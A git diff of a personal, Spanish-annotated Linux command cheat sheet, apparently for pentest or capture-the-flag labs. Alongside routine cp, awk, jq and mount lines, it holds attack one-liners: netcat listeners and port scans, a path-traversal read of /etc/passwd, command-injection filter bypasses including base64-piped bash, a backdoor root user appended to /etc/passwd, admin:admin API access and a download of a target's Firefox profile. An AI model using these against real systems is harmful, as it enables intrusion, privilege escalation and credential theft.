@@ -11,6 +11,10 @@ a> nc -lnvp 9001 > file
 # nc port-scanner
 nc -zv 172.17.0.1 1-1000
 
+# nc
+nc -zv -w 5 raspberrypi 22
+nc --proxy 192.168.1.27:2080 --proxy-type socks5 -z -v -w 5 192.168.1.1 80
+
 # abre un puerto y queda a la espera de conexiones
 rlwrap nc -lnvp PUERTO 
 
@@ -22,6 +26,7 @@ cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $!
 cp -rp /home/my_home /media/backup/my_home # copia recursiva y mantiene permisos y propietario
 cp /etc/apache2/sites-available/self-service-password.conf{,.bak} # crea archivo de backup
 
+
 # cat
 cat file | tr '[A-Z]' '[a-z]' # convierte Mayusculas por Minusculas
 cat file | grep ::: | awk -F: '{print $1":"$4}'
@@ -29,6 +34,7 @@ cat file | xclip -sel clip # copia el contenido del archivo en el portapapeles
 cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
 cat /etc/passwd | awk 'NR==17'
 pwdx --> chequear path de un PID
+cat file.json | jq '. | map_values(keys)'
 
 # xclip
 xclip -out -sel clip > file
@@ -53,7 +59,8 @@ find / -newermt "2022-10-15" ! -newermt "2022-10-16" -ls 2>/dev/null | less -S #
 
 # mount
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
-sudo mount -t cifs //10.16.22.245/SCANNERDOC /mnt/ -o user=USER,vers=2.0
+mount -t cifs //10.16.22.245/SCANNERDOC /mnt/ -o user=USER,vers=2.0
+mount | column -t # currently mounted filesystems in nice layout
 
 # manipulacion de texto
 pdftotext -layout origen.pdf origen.txt
@@ -87,6 +94,7 @@ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City"
 curl http://10.10.62.107:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd --path-as-is
 curl -s -X GET http://admin:admin@10.10.189.8:3000/api/admin/settings | jq
 
+curl -s http://10.10.10.10 --data-urlencode 'cmd=ls -la' | pup 'code' text{}
 ## bypassing
 curl -s -X POST http://10.10.57.159/secret/ -d command="echo 'bHMgLWxhCg==' | base64 -d | ba's'h" | awk '/<h2/,/<\/h2>/'
 curl -s -X POST http://10.10.151.118/secret/ -d command="c\at /etc/passwd"
@@ -95,6 +103,8 @@ curl -s -X POST http://10.10.151.118/secret/ -d command="c\at /etc/passwd"
 awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
 awk '{print $1}' FS=':' # FS=delimitador
+awk '/<pre>/,/<\/pre>/{print}' archivo.html
+awk '/start_pattern/,/stop_pattern/' file.txt # Display a block of text with AWK
 
 # echo
 echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd # crear un usuario 'root2' con el PASSWORD creado
@@ -157,18 +167,22 @@ sudo apt install -y spice-vdagent && spice-vdagent # spice qemu copy-paste (apli
 remote-viewer spice://localhost:5900 -f & disown
 virt-viewer --connect qemu:///system --wait kali64-OS &>/dev/null & disown # levanta el proceso + oculta el output + disocia el proceso de la terminal
 
+# wget
+wget --recursive http://ip -q
+wget -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
+wget  -q --show-progress --progress=bar:force 2>&1 # muestra solo la barra de progreso
+wget -m ftp://10.10.10.10
+
 # varios
 adduser --no-create-home --shell /usr/sbin/nologin 
+
+ps awwfux | less -S
 
 apt list --installed > instalados.txt
 diff old.txt new.txt | grep ">"|cut -c 3- > diff.txt
 
 dpkg -i DEB &>/dev/null # esconde output + error 
 dpkg-deb -xv file.deb file.out # descomprime el deb
-
-wget --recursive http://ip -q
-wget -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
-wget  -q --show-progress --progress=bar:force 2>&1 # muestra solo la barra de progreso
 
 apt-get install git htop -qq > /dev/null # muestra solo los errores
 
